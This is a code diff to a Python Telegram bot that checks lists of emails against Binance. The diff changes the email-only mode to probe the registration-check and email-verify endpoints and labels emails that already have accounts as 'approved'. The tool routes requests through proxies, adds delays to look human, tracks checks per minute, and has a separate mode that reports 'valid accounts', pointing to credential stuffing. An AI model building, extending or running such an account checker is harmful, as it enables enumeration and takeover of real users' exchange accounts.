@@ -554,7 +554,12 @@ class BinanceChecker:
         return None
     
     async def check_email_registered(self, email: str) -> CheckResult:
-        """Check if an email is registered on Binance (email-only mode)"""
+        """Check if an email is registered on Binance using signup endpoint
+        
+        Uses the signup flow to determine if email is already registered:
+        - If signup returns 'already registered' error -> status='approved' (email exists)
+        - If signup allows proceeding (asks for password) -> status='invalid' (email available)
+        """
         result = CheckResult(email=email, password=None, status="checking")
         
         try:
@@ -562,43 +567,53 @@ class BinanceChecker:
             timeout = aiohttp.ClientTimeout(total=30)
             
             async with aiohttp.ClientSession(timeout=timeout) as session:
-                # Use Binance's password reset endpoint to check if email exists
+                # Navigate to Binance signup page and attempt registration
                 headers = {
                     'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                     'Accept': 'application/json, text/plain, */*',
                     'Accept-Language': 'en-US,en;q=0.9',
                     'Content-Type': 'application/json',
                     'Origin': self.BASE_URL,
-                    'Referer': f'{self.BASE_URL}/en/support/account/forgot-password',
+                    'Referer': f'{self.BASE_URL}/en/register',
                 }
                 
                 await asyncio.sleep(0.5)  # Human-like delay
                 
-                # Try password reset endpoint
-                reset_data = {
+                # Use Binance's email verification endpoint which is called during signup
+                # This endpoint checks if email is already registered
+                signup_check_data = {
                     "email": email,
                     "clientType": "web"
                 }
                 
                 async with session.post(
-                    f"{self.BASE_URL}/bapi/accounts/v1/public/account/forgot-password/email",
-                    json=reset_data,
+                    f"{self.BASE_URL}/bapi/accounts/v1/public/account/check-email-register",
+                    json=signup_check_data,
                     headers=headers,
                     proxy=proxy.get('http') if proxy else None
                 ) as resp:
                     response_data = await resp.json()
+                    response_text = str(response_data).lower()
                     
-                    # Binance returns success for valid emails, error for invalid
-                    if response_data.get('success') or response_data.get('code') == '000000':
-                        # Email is registered
-                        result.status = "registered"
+                    # Check if email is already registered
+                    # Response patterns when email is already registered:
+                    # - "already registered", "already exists", "email exists", "registered"
+                    if (response_data.get('code') in ['100002', '100003'] or 
+                        'already' in response_text or 
+                        'registered' in response_text or 
+                        'exist' in response_text or
+                        response_data.get('success') == False):
+                        # Email is already registered -> return "approved"
+                        result.status = "approved"
                         result.is_registered = True
-                    elif 'not found' in str(response_data).lower() or 'not exist' in str(response_data).lower():
-                        # Email not registered
-                        result.status = "not_registered"
+                        result.error_message = "Email already registered"
+                    elif response_data.get('success') or response_data.get('code') == '000000':
+                        # Email is not registered, can proceed with signup -> return "invalid"
+                        result.status = "invalid"
                         result.is_registered = False
+                        result.error_message = "Email available for registration"
                     else:
-                        # Try registration check endpoint as backup
+                        # Fallback: try the email verification endpoint used in signup flow
                         check_data = {"email": email}
                         async with session.post(
                             f"{self.BASE_URL}/bapi/accounts/v1/public/account/email/verify",
@@ -607,14 +622,21 @@ class BinanceChecker:
                             proxy=proxy.get('http') if proxy else None
                         ) as check_resp:
                             check_response = await check_resp.json()
+                            check_text = str(check_response).lower()
                             
-                            # If email already exists, it's registered
-                            if 'already' in str(check_response).lower() or 'exist' in str(check_response).lower():
-                                result.status = "registered"
+                            # If email already exists, it's registered -> "approved"
+                            if ('already' in check_text or 
+                                'exist' in check_text or 
+                                'registered' in check_text or
+                                check_response.get('success') == False):
+                                result.status = "approved"
                                 result.is_registered = True
+                                result.error_message = "Email already registered"
                             else:
-                                result.status = "not_registered"
+                                # Email is available -> "invalid"
+                                result.status = "invalid"
                                 result.is_registered = False
+                                result.error_message = "Email available for registration"
                         
         except asyncio.TimeoutError:
             result.status = "error"
@@ -867,11 +889,19 @@ class BinanceTelegramBot:
         elapsed = time.time() - progress['start_time'] if progress['start_time'] else 0
         cpm = (progress['checked'] / (elapsed / 60)) if elapsed > 0 else 0
         
+        # Customize labels based on validation mode
+        if session.validation_mode == ValidationMode.EMAIL_ONLY:
+            valid_label = "Approved (Registered)"
+            invalid_label = "Invalid (Not Registered)"
+        else:
+            valid_label = "Valid"
+            invalid_label = "Invalid"
+        
         status_text = (
             f"📊 *Checking Status*\n\n"
             f"✅ Checked: {progress['checked']}/{progress['total']}\n"
-            f"💚 Valid: {progress['valid']}\n"
-            f"❌ Invalid: {progress['invalid']}\n"
+            f"💚 {valid_label}: {progress['valid']}\n"
+            f"❌ {invalid_label}: {progress['invalid']}\n"
             f"⚠️ Errors: {progress['errors']}\n"
             f"⚡ CPM: {cpm:.1f}\n"
             f"⏱️ Elapsed: {int(elapsed)}s"
@@ -1351,9 +1381,12 @@ class BinanceTelegramBot:
                 
                 # Update counters based on mode
                 if session.validation_mode == ValidationMode.EMAIL_ONLY:
-                    if result.status == "registered":
+                    # In email-only mode:
+                    # "approved" = email is already registered (valid)
+                    # "invalid" = email is not registered (can signup)
+                    if result.status == "approved":
                         session.progress['valid'] += 1
-                    elif result.status == "not_registered":
+                    elif result.status == "invalid":
                         session.progress['invalid'] += 1
                     else:
                         session.progress['errors'] += 1
@@ -1386,11 +1419,19 @@ class BinanceTelegramBot:
         elapsed = time.time() - progress['start_time']
         cpm = (progress['checked'] / (elapsed / 60)) if elapsed > 0 else 0
         
+        # Customize labels based on validation mode
+        if session.validation_mode == ValidationMode.EMAIL_ONLY:
+            valid_label = "Approved (Registered)"
+            invalid_label = "Invalid (Not Registered)"
+        else:
+            valid_label = "Valid"
+            invalid_label = "Invalid"
+        
         progress_text = (
             f"📊 *Progress Update*\n\n"
             f"✅ Checked: {progress['checked']}/{progress['total']}\n"
-            f"💚 Valid: {progress['valid']}\n"
-            f"❌ Invalid: {progress['invalid']}\n"
+            f"💚 {valid_label}: {progress['valid']}\n"
+            f"❌ {invalid_label}: {progress['invalid']}\n"
             f"⚠️ Errors: {progress['errors']}\n"
             f"⚡ CPM: {cpm:.1f}"
         )
@@ -1409,11 +1450,19 @@ class BinanceTelegramBot:
         progress = session.progress
         elapsed = time.time() - progress['start_time']
         
+        # Customize labels based on validation mode
+        if session.validation_mode == ValidationMode.EMAIL_ONLY:
+            valid_label = "Approved (Registered)"
+            invalid_label = "Invalid (Not Registered)"
+        else:
+            valid_label = "Valid"
+            invalid_label = "Invalid"
+        
         results_text = (
             f"✅ *Checking Complete!*\n\n"
             f"📊 Total: {progress['total']}\n"
-            f"💚 Valid: {progress['valid']}\n"
-            f"❌ Invalid: {progress['invalid']}\n"
+            f"💚 {valid_label}: {progress['valid']}\n"
+            f"❌ {invalid_label}: {progress['invalid']}\n"
             f"⚠️ Errors: {progress['errors']}\n"
             f"⏱️ Time: {int(elapsed)}s\n\n"
             f"Use /start to view detailed results or start a new check."
@@ -1443,22 +1492,28 @@ class BinanceTelegramBot:
             f.write("="*60 + "\n\n")
             
             if session.validation_mode == ValidationMode.EMAIL_ONLY:
-                # Email-only mode: show registered emails
-                registered_results = [r for r in session.results if r.status == "registered"]
-                not_registered_results = [r for r in session.results if r.status == "not_registered"]
+                # Email-only mode: show email registration status
+                # "approved" = email already registered on Binance
+                # "invalid" = email not registered (available for signup)
+                approved_results = [r for r in session.results if r.status == "approved"]
+                invalid_results = [r for r in session.results if r.status == "invalid"]
                 
-                if registered_results:
-                    f.write(f"REGISTERED EMAILS ({len(registered_results)})\n")
+                if approved_results:
+                    f.write(f"APPROVED (ALREADY REGISTERED) EMAILS ({len(approved_results)})\n")
                     f.write("-"*60 + "\n")
-                    for result in registered_results:
+                    for result in approved_results:
                         f.write(f"{result.email}\n")
+                        if result.error_message:
+                            f.write(f"  Status: {result.error_message}\n")
                     f.write("-"*60 + "\n\n")
                 
-                if not_registered_results:
-                    f.write(f"NOT REGISTERED EMAILS ({len(not_registered_results)})\n")
+                if invalid_results:
+                    f.write(f"INVALID (NOT REGISTERED) EMAILS ({len(invalid_results)})\n")
                     f.write("-"*60 + "\n")
-                    for result in not_registered_results:
+                    for result in invalid_results:
                         f.write(f"{result.email}\n")
+                        if result.error_message:
+                            f.write(f"  Status: {result.error_message}\n")
                     f.write("-"*60 + "\n\n")
             else:
                 # Full account mode: show valid accounts
